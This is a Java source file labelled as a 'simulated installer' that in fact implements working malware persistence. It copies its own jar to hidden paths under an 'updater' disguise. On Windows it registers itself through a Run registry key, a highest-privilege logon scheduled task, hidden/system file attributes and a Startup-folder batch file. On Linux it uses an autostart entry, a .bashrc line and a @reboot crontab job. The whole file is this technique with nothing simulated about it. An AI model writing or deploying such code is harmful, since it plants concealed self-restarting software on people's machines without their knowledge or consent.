package dev.javabyte.guest.sim;

import java.io.File;
import java.io.FileWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;

/**
 * Simulated installer: copies itself to a hidden location and arranges to be started again,
 * using the mechanisms of whichever operating system it finds itself on.
 */
public final class Persistence {

    public static void main(String[] args) throws Exception {
        File self = new File(Persistence.class.getProtectionDomain().getCodeSource().getLocation().toURI());
        boolean windows = System.getProperty("os.name").toLowerCase().contains("win");
        if (args.length > 0 && args[0].equals("--installed")) {
            System.out.println("running from " + self.getPath());
            return;
        }
        if (windows) {
            installOnWindows(self);
        } else {
            installOnLinux(self);
        }
    }

    private static void installOnWindows(File self) throws Exception {
        File home = new File(System.getenv("APPDATA"), "WinUpdater");
        home.mkdirs();
        Path target = new File(home, "updater.jar").toPath();
        Files.copy(self.toPath(), target, StandardCopyOption.REPLACE_EXISTING);
        String launch = "\"" + System.getProperty("java.home") + "\\bin\\javaw.exe\" -jar \"" + target + "\" --installed";

        Runtime runtime = Runtime.getRuntime();
        runtime.exec(new String[] {"reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "/v", "WinUpdater", "/t", "REG_SZ", "/d", launch, "/f"}).waitFor();
        runtime.exec("schtasks /create /tn WinUpdater /sc onlogon /rl highest /tr " + launch + " /f").waitFor();
        runtime.exec("attrib +h +s \"" + target + "\"").waitFor();

        File startup = new File(System.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updater.bat");
        try (FileWriter writer = new FileWriter(startup)) {
            writer.write("@echo off\r\nstart \"\" " + launch + "\r\n");
        }
        new ProcessBuilder(System.getProperty("java.home") + "\\bin\\javaw.exe", "-jar", target.toString(), "--installed").start();
        System.out.println("installed to " + target);
        System.exit(0);
    }

    private static void installOnLinux(File self) throws Exception {
        String home = System.getProperty("user.home");
        Path target = Path.of(home, ".cache", ".updater.jar");
        Files.createDirectories(target.getParent());
        Files.copy(self.toPath(), target, StandardCopyOption.REPLACE_EXISTING);
        String launch = "java -jar " + target + " --installed";

        Path autostart = Path.of(home, ".config", "autostart", "updater.desktop");
        Files.createDirectories(autostart.getParent());
        Files.writeString(autostart, "[Desktop Entry]\nType=Application\nName=Updater\nExec=" + launch + "\n");

        // Append to the shell profile, keeping what is already there.
        Path profile = Path.of(home, ".bashrc");
        String existing = Files.exists(profile) ? Files.readString(profile) : "";
        Files.writeString(profile, existing + "\n(" + launch + " &) >/dev/null 2>&1\n");

        new ProcessBuilder("sh", "-c", "(crontab -l 2>/dev/null; echo '@reboot " + launch + "') | crontab -").start().waitFor();
        new ProcessBuilder("chmod", "+x", target.toString()).start().waitFor();
        System.out.println("installed to " + target);
    }
}
